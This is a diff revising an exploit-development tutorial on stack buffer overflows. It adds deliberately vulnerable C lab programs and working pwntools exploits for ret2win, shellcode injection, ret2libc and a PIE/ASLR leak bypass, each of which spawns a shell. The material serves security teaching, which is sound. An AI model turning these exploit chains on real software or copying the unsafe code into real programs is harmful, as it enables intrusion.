@@ -22,7 +22,7 @@ No hand-waving. No skipping the hard parts.
 
 ---
 
-## 1. The Stack: A Precise Mental Model
+##  The Stack: A Precise Mental Model
 
 Before you can exploit it, you need to see it clearly.
 
@@ -71,7 +71,7 @@ That `ret` instruction is your target. It pops whatever is sitting at `[RSP]` in
 
 ---
 
-## 2. The Vulnerability: What "Buffer Overflow" Actually Means
+##  The Vulnerability: What "Buffer Overflow" Actually Means
 
 A buffer is a fixed-size region of memory. In C, when you write to a buffer, the language does not check bounds. There is no runtime exception. The CPU will faithfully copy bytes past the end of the buffer into whatever memory follows it — which, on the stack, is the saved RBP and the return address.
 
@@ -107,12 +107,12 @@ When `vuln()` returns, `ret` pops your 8 bytes into RIP. If those bytes are a va
 
 ---
 
-## 3. Environment Setup
+##  Environment Setup
 
 ```bash
 # Ubuntu 22.04 / Debian — install everything you need
 sudo apt update
-sudo apt install -y gcc gdb python3 python3-pip pwndbg nasm binutils
+sudo apt install -y gcc gdb python3 python3-pip nasm binutils
 
 # pwntools
 pip3 install pwntools
@@ -121,8 +121,7 @@ pip3 install pwntools
 git clone https://github.com/pwndbg/pwndbg
 cd pwndbg && ./setup.sh
 
-# checksec — inspect binary protections
-pip3 install checksec
+sudo apt install checksec
 ```
 
 Compile with protections **disabled** for the first examples, then we'll enable them one by one:
@@ -159,7 +158,7 @@ Each of these is a mitigation we'll encounter and defeat:
 
 ---
 
-## 4. Lab 1 — Classic ret2win (No Mitigations)
+##  Lab 1 — Classic ret2win (No Mitigations)
 
 ### Source
 
@@ -176,10 +175,16 @@ void win(void) {
 void vuln(void) {
     char buf[64];
     printf("input: ");
+    fflush(stdout); // Forces the prompt out cleanly
     gets(buf);
 }
 
 int main(void) {
+    // Disable all buffering for pwntools compatibility
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
     vuln();
     return 0;
 }
@@ -200,7 +205,7 @@ gdb ./lab1
 Generate a De Bruijn (cyclic) pattern — a string where every 8-byte substring is unique, so you can find the exact offset from the crash:
 
 ```
-pwndbg> cyclic 200
+pwndbg> cyclic 200 -n 8
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaaa
 ```
 
@@ -216,7 +221,7 @@ RIP: 0x6161616161616166 ('faaaaaaa')
 ```
 
 ```
-pwndbg> cyclic -l 0x6161616161616166
+pwndbg> cyclic -l 0x616161616161616a -n 8
 72
 ```
 
@@ -242,49 +247,63 @@ $1 = {<text variable, no debug info>} 0x401196 <win>
 # exploit_lab1.py
 from pwn import *
 
-elf = ELF('./lab1')
-p   = process('./lab1')
+# Set up target binary context
+context.binary = elf = ELF('./lab1')
 
-offset   = 72
+# Start the local process
+p = process('./lab1')
+
+offset = 72
 win_addr = elf.symbols['win']
+ret_gadget = 0x401016
 
-log.info(f"win @ {hex(win_addr)}")
+log.info(f"win() entry point @ {hex(win_addr)}")
+log.info(f"Stack alignment ret @ {hex(ret_gadget)}")
 
-payload = flat(
-    b'A' * offset,
-    p64(win_addr)
-)
+# Build payload exactly like your successful terminal exploit
+payload = b'A' * offset + p64(ret_gadget) + p64(win_addr)
 
-p.sendlineafter(b'input: ', payload)
+# Read clean up to the prompt, send payload, then push an explicit newline
+p.recvuntil(b'input: ')
+p.sendline(payload)
+
+# Clean out the terminal buffer
+print(p.recvline().decode())
+
 p.interactive()
 ```
 
 ```bash
 python3 exploit_lab1.py
 # [*] you called win()
-# $ whoami
-# mrdevnull
 ```
 
 Done. You've overwritten the return address and redirected execution to `win()`.
 
 ---
 
-## 5. Lab 2 — Shellcode Injection (NX Disabled)
+##  Lab 2 — Shellcode Injection (NX Disabled)
 
 When there's no `win()` function, you inject your own code. This requires NX to be off so the stack is executable.
 
 ```c
 // lab2.c
 #include <stdio.h>
+#include <unistd.h>
 
 void vuln(void) {
     char buf[128];
+    printf("leak: %p\n", (void*)buf);
     printf("input: ");
+    fflush(stdout);
     read(0, buf, 256);  // reads 256 bytes into 128-byte buffer
 }
 
 int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
     vuln();
     return 0;
 }
@@ -304,9 +323,8 @@ The plan:
 
 ```
 gdb ./lab2
-pwndbg> break vuln
 pwndbg> run < <(python3 -c "import sys; sys.stdout.buffer.write(b'A'*200)")
-pwndbg> x/20gx $rsp
+pwndbg> x/24gx $rsp
 ```
 
 Look for your `0x4141414141414141` pattern and find where `buf` starts relative to RBP. Or use:
@@ -331,7 +349,6 @@ p = process('./lab2')
 # pwntools built-in shellcode: execve("/bin/sh", NULL, NULL)
 shellcode = asm(shellcraft.sh())
 
-# gdb: buf is at rbp-0x80, return addr at rbp+0x08
 # total offset = 0x80 + 0x08 = 136 bytes
 offset = 136
 
@@ -367,9 +384,33 @@ payload = nop_sled + shellcode + padding + p64(buf_addr + 10)
 
 ---
 
-## 6. Lab 3 — ret2libc (NX Enabled, no PIE, no canary)
+##  Lab 3 — ret2libc (NX Enabled, no PIE, no canary)
 
 NX is on. The stack is not executable. We can't run shellcode on the stack. Instead, we return into existing executable code — specifically into `libc`'s `system()` function with `/bin/sh` as the argument.
+
+```c
+// lab3.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void vuln(void) {
+    char buf[64];
+    printf("leak: %p\n", (void*)&system);
+    printf("input: ");
+    fflush(stdout);
+    read(0, buf, 256);
+}
+
+int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
+    vuln();
+    return 0;
+}
+```
 
 ```bash
 gcc -o lab3 lab3.c -fno-stack-protector -no-pie
@@ -416,38 +457,39 @@ With no PIE, `lab3` is at a fixed base. But libc IS randomized by ASLR. For now 
 ### Exploit
 
 ```python
-# exploit_lab3.py
+# exploit3.py
 from pwn import *
 
-elf  = ELF('./lab3')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-p    = process('./lab3')
+context.arch = 'amd64'
 
-offset = 72  # same as before for a 64-byte buf
+elf = ELF('./lab3')
+p = process('./lab3')
 
-# With no ASLR: libc base is fixed
-# In real exploit: compute from leak (lab4 shows this)
-libc.address = 0x00007ffff7dc4000  # get from: gdb, vmmap, or /proc/PID/maps
+# 1. Parse runtime position of system()
+p.recvuntil(b'leak: ')
+system_leak = int(p.recvline().strip(), 16)
 
-pop_rdi  = 0x00000000004011d3          # from ROPgadget
-bin_sh   = next(libc.search(b'/bin/sh'))
-system   = libc.sym['system']
+# 2. Compute dynamic libc base address
+libc = ELF(p.libc.path)
+libc.address = system_leak - libc.sym['system']
+log.success(f"Libc Base Address: {hex(libc.address)}")
 
-# x86-64 ABI: stack must be 16-byte aligned before CALL.
-# 'system' internally does MOVAPS which requires alignment.
-# Add a 'ret' gadget to adjust alignment by 8 bytes.
-ret_gadget = 0x000000000040101a       # a bare 'ret' from the binary
+# 3. Pull the gadgets directly out of libc safely
+libc_rop = ROP(libc)
+pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
+ret_gadget = libc_rop.find_gadget(['ret'])[0]
 
-log.info(f"pop rdi  @ {hex(pop_rdi)}")
-log.info(f"/bin/sh  @ {hex(bin_sh)}")
-log.info(f"system() @ {hex(system)}")
+bin_sh = next(libc.search(b'/bin/sh'))
+system = libc.sym['system']
+
+offset = 72
 
 payload = flat(
     b'A' * offset,
-    p64(ret_gadget),   # alignment fix
+    p64(ret_gadget),   
     p64(pop_rdi),
     p64(bin_sh),
-    p64(system),
+    p64(system)
 )
 
 p.sendlineafter(b'input: ', payload)
@@ -458,36 +500,49 @@ The **stack alignment** issue trips up many beginners. `system()` uses `movaps` 
 
 ---
 
-## 7. Lab 4 — Full ASLR + PIE Bypass (Leak → ret2libc)
+##  Lab 4 — Full ASLR + PIE Bypass (Leak → ret2libc)
 
 This is where the real game starts. PIE randomizes the binary base. ASLR randomizes libc. Every run, every address is different. You need a **leak**.
 
-### Strategy
+### The Dual-Randomization Strategy
 
-1. Use the overflow to call `puts(got['puts'])` — this prints the *runtime address* of `puts` in libc
-2. Parse the leak to compute libc base: `libc_base = leaked_puts - libc.sym['puts']`
-3. Send a second payload (via a `main` re-call) with correct addresses now computed
+Because PIE and ASLR are both active, we are dealing with two completely independent shifting targets. We must break them sequentially:
+
+1. **Bypass PIE (Binary Leak):** Parse the developer-provided `code_leak` pointer to calculate the dynamic base of our binary. This unlocks our local ROP gadgets, the PLT, and the GOT.
+2. **Bypass ASLR (Libc Leak):** Use our newly aligned local gadgets to launch a ROP chain calling `puts(got['printf'])`. This leaks the dynamic address of libc.
+3. **Compute & Execute:** Parse the libc leak, calculate the absolute address of `system()` and `"/bin/sh"`, and loop back to execute our final payload.
 
 ```c
-// lab4.c — same vuln, no win(), all mitigations except canary
+// lab4.c
 #include <stdio.h>
-#include <string.h>
+#include <unistd.h>
+
+void gadget_helper() {
+    __asm__("pop %rdi; ret");
+}
 
 void vuln(void) {
     char buf[64];
-    printf("input: ");
-    fflush(stdout);
+    printf("code_leak: %p\n", (void*)&vuln);
+    
+    puts("input: "); 
+    
     read(0, buf, 256);
 }
 
 int main(void) {
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
     vuln();
     return 0;
 }
+
 ```
 
 ```bash
-gcc -o lab4 lab4.c -fno-stack-protector -pie
+gcc -o lab4 lab4.c -fno-stack-protector -fcf-protection=none -pie
 checksec --file=lab4
 # NX: enabled, PIE: enabled
 ```
@@ -500,76 +555,78 @@ With PIE, you cannot use static gadget addresses. But leaked addresses are runti
 # exploit_lab4.py
 from pwn import *
 
-elf  = ELF('./lab4')
-libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
-p    = process('./lab4')
+context.arch = 'amd64'
+
+elf = ELF('./lab4')
+p = process('./lab4')
 
 offset = 72
 
-# ── Stage 1: leak libc via puts(got['puts']) ──────────────────────────
-# We need gadgets from the binary. With PIE, we must leak binary base first.
-# Trick: the binary's LOAD segment is mapped at page-aligned address.
-# We can use the PLT (which is position-independent) and GOT.
+# ==========================================
+# STAGE 1: Bypass PIE & Leak Libc
+# ==========================================
 
-# pwntools resolves PIE symbols at load time — use elf.plt / elf.got
-# which contain the OFFSET from base. We need to add elf.address (0 until leaked).
+# 1. Parse the initial PIE leak
+p.recvuntil(b'code_leak: ')
+vuln_leak = int(p.recvline().strip(), 16)
+elf.address = vuln_leak - elf.symbols['vuln']
+log.success(f"PIE Base Address: {hex(elf.address)}")
 
-# With PIE: first leak the binary base via an info leak if possible.
-# Alternatively: leak via the PLT/GOT directly since PLT is executable
-# and the dynamic linker resolves GOT lazily.
-
-# Find gadgets in the binary — with PIE, gadgets are at (elf.address + offset)
-# After loading, pwntools gives you raw offsets in elf.symbols.
-
-# We need: pop rdi; ret — search at load time
 rop = ROP(elf)
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
-ret     = rop.find_gadget(['ret'])[0]
+ret_gadget = rop.find_gadget(['ret'])[0]
 
-# puts@plt will call the real puts (resolving via GOT)
-# puts@got contains the runtime address of puts in libc
 puts_plt = elf.plt['puts']
-puts_got = elf.got['puts']
-main     = elf.sym['main']
+printf_got = elf.got['printf']
+vuln_sym = elf.symbols['vuln'] 
 
-log.info(f"pop rdi  @ {hex(pop_rdi)}")
-log.info(f"puts@plt @ {hex(puts_plt)}")
-log.info(f"puts@got @ {hex(puts_got)}")
-
-# Leak payload: call puts(got['puts']), then return to main for stage 2
-leak_payload = flat(
+payload1 = flat(
     b'A' * offset,
-    p64(ret),          # alignment
+    p64(ret_gadget),
     p64(pop_rdi),
-    p64(puts_got),
-    p64(puts_plt),
-    p64(main),         # loop back for second input
+    p64(printf_got),
+    p64(puts_plt), 
+    p64(ret_gadget),   # Fixes alignment before entering vuln for the second time
+    p64(vuln_sym)      
 )
 
-p.sendafter(b'input: ', leak_payload)
+p.sendafter(b'input: \n', payload1)
 
-# Parse the leaked address (puts prints until null byte, 6 bytes on x86-64)
-p.recvuntil(b'input: ')  # skip first prompt
-leaked = p.recvline().strip()
-leaked_puts = u64(leaked.ljust(8, b'\x00'))
-log.success(f"leaked puts @ {hex(leaked_puts)}")
+# 2. Parse the leaked address safely
+leaked_bytes = p.recvline().strip()
+leaked_printf = u64(leaked_bytes.ljust(8, b'\x00'))
+log.success(f"Absolute printf address: {hex(leaked_printf)}")
 
-# ── Stage 2: compute bases, send shell payload ────────────────────────
-libc.address = leaked_puts - libc.sym['puts']
-log.success(f"libc base  @ {hex(libc.address)}")
+# ==========================================
+# STAGE 2: Ret2Libc Execution
+# ==========================================
 
-bin_sh  = next(libc.search(b'/bin/sh'))
-system  = libc.sym['system']
+libc = ELF(p.libc.path)
+libc.address = leaked_printf - libc.sym['printf']
+log.success(f"Calculated Libc Base: {hex(libc.address)}")
 
-shell_payload = flat(
+libc_rop = ROP(libc)
+libc_pop_rdi = libc_rop.find_gadget(['pop rdi', 'ret'])[0]
+
+system_addr = libc.sym['system']
+bin_sh_addr = next(libc.search(b'/bin/sh'))
+
+payload2 = flat(
     b'A' * offset,
-    p64(ret),
-    p64(pop_rdi),
-    p64(bin_sh),
-    p64(system),
+    p64(ret_gadget),   # Fixes alignment for system()
+    p64(libc_pop_rdi),
+    p64(bin_sh_addr),
+    p64(system_addr)
 )
 
-p.sendafter(b'input: ', shell_payload)
+# Cleanly consume the second loop's banner text
+p.recvuntil(b'code_leak: ')
+p.recvline() 
+p.recvuntil(b'input: \n')
+
+# Send final payload to drop into the shell
+p.send(payload2)
+
 p.interactive()
 ```
 
@@ -577,43 +634,8 @@ This is the **canonical CTF exploit pattern**: leak → compute base → rop to 
 
 ---
 
-## 8. Debugging Methodology
 
-These are the GDB workflows you'll use constantly:
-
-```bash
-# Set a breakpoint right before the return
-gdb ./lab1
-pwndbg> break *vuln+42    # after gets() returns
-pwndbg> run
-
-# Inspect the stack at the moment of ret
-pwndbg> x/20gx $rsp        # show 20 qwords from RSP
-pwndbg> info frame           # show frame info: saved regs, frame addr
-
-# Step to the ret instruction and watch RIP change
-pwndbg> ni                   # next instruction (no follow calls)
-
-# Print a symbol's address
-pwndbg> p &win
-pwndbg> p system
-
-# Find strings
-pwndbg> search -s "/bin/sh"
-
-# Find ROP gadgets
-pwndbg> rop --grep "pop rdi"
-
-# Inspect mappings (ASLR, libc base)
-pwndbg> vmmap
-
-# Dump memory as hex + ASCII
-pwndbg> hexdump $rsp 64
-```
-
----
-
-## 9. How Mitigations Actually Work (and Their Limits)
+##  How Mitigations Actually Work (and Their Limits)
 
 ### Stack Canary
 
@@ -653,7 +675,7 @@ The kernel randomizes the base address of stack, heap, and shared libraries inde
 
 ---
 
-## 10. Real Vulnerability Patterns
+##  Real Vulnerability Patterns
 
 Pure `gets()` barely exists in the wild. Here's what real overflow triggers look like:
 
@@ -689,7 +711,7 @@ Each of these creates the same primitive: controlled bytes written past the end 
 
 ---
 
-## 11. Putting It Together: The Exploit Development Workflow
+##  Putting It Together: The Exploit Development Workflow
 
 When you encounter a binary with a suspected stack overflow:
 
@@ -715,4 +737,9 @@ The exploit is always a pipeline: corrupt the return address with a chain that a
 
 Stack-based buffer overflow is the entry point. The same principle — controlled write past a buffer's end — powers everything above it in complexity. In the next part we'll look at **ret2plt and GOT hijacking** in depth, and then move into the heap where the allocator metadata becomes the target.
 
+
 The stack is where every exploit developer learns to walk. Now you run.
+
+*tools: gcc · gdb · pwndbg (chunk, vis_heap_chunks, bins commands) · pwntools*
+
+*tested: Ubuntu 22.04, glibc 2.35, kernel 5.15, x86-64*
